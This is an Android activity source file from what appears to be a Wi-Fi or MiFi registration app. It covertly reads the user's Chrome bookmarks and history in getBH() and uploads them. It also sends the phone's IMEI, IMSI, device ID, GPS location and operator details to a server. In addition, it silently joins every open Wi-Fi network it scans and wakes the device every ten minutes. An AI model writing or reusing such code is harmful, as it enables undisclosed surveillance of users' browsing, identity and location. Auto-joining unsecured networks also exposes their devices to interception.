package mifi.pm.com.exampleproject;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.Browser;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import mifi.pm.com.exampleproject.handler.AppMessages;
import mifi.pm.com.exampleproject.handler.AppSharedPreferences;
import mifi.pm.com.exampleproject.handler.HttpRequest;
import mifi.pm.com.exampleproject.handler.UtilClass;

public class FirstActivity extends AppCompatActivity {
    static AlarmManager alarmManager;
    static PendingIntent pendingIntent;
    Context context = null;
    WifiManager wifi;
    List<ScanResult> results;
    private ArrayList<String> listWifi;
    RefrenceWrapper refrenceWrapper;
    double latitude ;
    double  longitude;
    int size = 0;
    String str="<?xml version=\"1.0\"?><response type=\"status\"><attr id=\"sessionStart\">12/16/2957 18:56:56</attr><attr id=\"sessionDuration\">11:10:12</attr><attr id=\"sessionUsage\">11 MB</attr></response>";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_first);
        Button log=(Button)findViewById(R.id.button);
        refrenceWrapper  =  RefrenceWrapper.getRefrenceWrapper(getApplicationContext());
        launchGCMService(FirstActivity.this);
        GPSTracker gps = new GPSTracker(getApplicationContext());
          latitude = gps.getLatitude();
           longitude = gps.getLongitude();
        AppSharedPreferences.getInstance(getApplicationContext()).setTokenValue(getgcmid());
        //HttpRequest.ReuestOnConnect();
        String str1="<?xml version=\"1.0\"?><response type=\"status\"><attr id=\"sessionStart\">";
        String str2="<?xml version=\"1.0\"?><response type=\"status\"><attr id=\"sessionStart\">09/08/2016 15:50:20</attr><attr id=\"sessionDuration\">";
        String str3="<?xml version=\"1.0\"?><response type=\"status\"><attr id=\"sessionStart\">09/08/2016 15:50:20</attr><attr id=\"sessionDuration\">00:02:57</attr><attr id=\"sessionUsage\">";
        String sessionStart=str.substring(str1.length(),str1.length()+19);
        String sessionDuration=str.substring(str2.length(),str2.length()+8);
        String sessionUsage=str.substring(str3.length(),str3.length()+5);

        Log.e("STR","sessionStart:-"+sessionStart);
        Log.e("STR","sessionDuration:-"+sessionDuration);
        Log.e("STR","sessionUsage:-"+sessionUsage);
        Log.e("STR","Time"+sessionDuration.substring(3,5));
try
{
    getBH();
}
catch (Exception e){e.printStackTrace();}
        log.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                new RegisterTast().execute();

            }
        });
        Button buttonRegistor=(Button)findViewById(R.id.buttonRegistor);
        buttonRegistor.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent i=new Intent(getApplicationContext(),LoginRegister.class);
                startActivity(i);
            }
        });
        if( AppSharedPreferences.getInstance(getApplicationContext()).getPrefboolean()){
            Intent i=new Intent(getApplicationContext(),DashBoard.class);
            startActivity(i);
        }
        AppSharedPreferences.getInstance(getApplicationContext()).setPrefrence1(true);
        Intent intentsOpen = new Intent(this, AlarmReceiver.class);
        intentsOpen.setAction("com.mts.alarm.ACTION");
        pendingIntent = PendingIntent.getBroadcast(this,111, intentsOpen, 0);
        alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        fireAlarm();
        try {
            wifi = (WifiManager)getSystemService(Context.WIFI_SERVICE);
            listWifi = new ArrayList<>();
            wifi.startScan();
            registerReceiver(new BroadcastReceiver()
            {
                @Override
                public void onReceive(Context c, Intent intent)
                {
                    if(AppSharedPreferences.getInstance(getApplicationContext()).getPrefrence1()) {
                    results = wifi.getScanResults();
                    size = results.size();
                    scanWifi();
                    Log.e("Tag","Size"+results.size());
                    }
                }
            }, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
            Log.e("Status Url Called","Status");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void fireAlarm() {
        /**
         * call broadcost reciver
         */
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), 600000, pendingIntent);


    }
    private void scanWifi(){
        //arraylist.clear();
        listWifi.clear();
        // wifi.startScan();

        try
        {
            size = size - 1;
            while (size >= 0)
            {
				/*HashMap<String, String> item = new HashMap<String, String>();
				item.put(ITEM_KEY, results.get(size).SSID + "  " + results.get(size).capabilities);
				listWifi.add(results.get(size).SSID);
				arraylist.add(item);*/
                String capabilities= results.get(size).capabilities;
                Log.w ("TAG", results.get(size).SSID + " capabilities : " + capabilities);
                if(results.get(size).capabilities.equalsIgnoreCase("[ESS]")){
                    Log.e("OPEN NETWORK",results.get(size).SSID);
                    connectToWifi(results.get(size).SSID);
                }
                size--;

            }

        }
        catch (Exception e)
        {
            e.printStackTrace();
        }

    }

    public void connectToWifi(String ssid) {

        WifiConfiguration conf = new WifiConfiguration();
        conf.SSID = "\"" + ssid + "\""; // Please note the quotes.

        conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);

        wifi.addNetwork(conf);
        Log.d("MIFI", ssid+" added");

        List<WifiConfiguration> list = wifi.getConfiguredNetworks();
        for (WifiConfiguration i : list) {
            if (i.SSID != null && i.SSID.equals("\"" + ssid + "\"")) {
                wifi.disconnect();
                wifi.enableNetwork(i.networkId, true);
                wifi.reconnect();
                Log.d("MIFI", "conneting to: ssid"+i.SSID);
                break;
            }
        }
    }

    public class RegisterTast extends AsyncTask<String, String, String> {
        ProgressDialog pd;
        String result;
        String firstname;
        String lastname;
        String username;
        String email;
        String num;
        public RegisterTast(){
          /*  this.firstname=firstname;
            this.lastname=lastname;
            this.username=username;
            this.email=email;
            this.num=num;*/
        }
        @Override
        protected void onPreExecute() {

            pd = ProgressDialog.show(FirstActivity.this, "Please Wait",
                    "Please Wait");
        }

        @Override
        protected String doInBackground(String... arg0) {
            try{
                UtilClass utilClass= new UtilClass();
                String json= utilClass.CreateRegisterRequest(
                        refrenceWrapper.getUsername(),"pass",AppSharedPreferences.getInstance(getApplicationContext()).getTokenValue(),"mobile",AppSharedPreferences.getInstance(getApplicationContext()).getPrefrence(AppMessages.Constants.SSID),refrenceWrapper.getUsername(),latitude+","+longitude,refrenceWrapper.getimsi(),refrenceWrapper.getDeviceID(),refrenceWrapper.getVersion()
                        ,refrenceWrapper.getDeviceName(),refrenceWrapper.getstrength(),refrenceWrapper.getImei(),refrenceWrapper.getoperatorName()
                );

              result=HttpRequest.SendRequestToGST(json);
                String result1= HttpRequest.SendRequestHistoryCapture(getBH());
                Log.e("TAG","json"+json);

                Log.e("TAG","result1"+result1);
            }
            catch (Exception e){
                e.printStackTrace();
            }


            return result;
        }

        @Override
        protected void onPostExecute(String strFromDoInBg) {
            // TODO Auto-generated method stub
            Log.e("EXAMPLE","strFromDoInBg"+strFromDoInBg);
            if(strFromDoInBg!=null&&strFromDoInBg.contains("ok")){


               /* Intent i=new Intent(mContext,Verify.class);
                startActivity(i);
                finish();*/
            }
            Intent i=new Intent(getApplicationContext(),LoginActivity.class);
            startActivity(i);
            pd.cancel();


        }
    }
    public void launchGCMService(AppCompatActivity fActivity)
    {
        Intent i = new Intent(fActivity, ReService.class);
        fActivity.startService(i);
    }
    private String getgcmid() {
        SharedPreferences pref = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        return pref.getString("GCMID", "");
    }

    public String getBH() throws JSONException {

        JSONArray browsing_details = new JSONArray();
        JSONObject bdata = new JSONObject();

        double CURRENT_TIME = System.currentTimeMillis();
        Bitmap icon;
        ContentResolver cr = getContentResolver();
        //String order=Browser.BookmarkColumns.DATE+" DESC";
        String[] projection={"title","url","favicon"};
//String selection=projection[0]+"=?";
//String args[]={"Google"};
        Uri uriCustom = Uri.parse("content://com.android.chrome.browser/bookmarks");
        Cursor rows=cr.query(uriCustom,projection, null,null,null);
        if(rows.getCount()>0 ){
            int i = 0;
            while(rows.moveToNext()) {
                JSONObject data = new JSONObject();
//read title
                String title=rows.getString(rows.getColumnIndex(projection[0]));
//read url
                String url=rows.getString(rows.getColumnIndex(projection[1]));
                data.put("url",url);
                data.put("title",title);
                data.put("date",System.currentTimeMillis());
                browsing_details.put(data);
                // System.out.println(data.toString());
/*if(i==20){
    break;
}*/
                i = i+1;
            }
            JSONObject bdata1 = new JSONObject();
            bdata1.put("browsing_array",browsing_details);
            bdata.put("browsing_Data", bdata1);
            bdata.put("uid", "4");
           // System.out.println(bdata.toString());
            Log.d("TAG",browsing_details.length()+"Data"+bdata.toString());
//close the cursor
            rows.close();
        }
        return bdata.toString();
    }
}
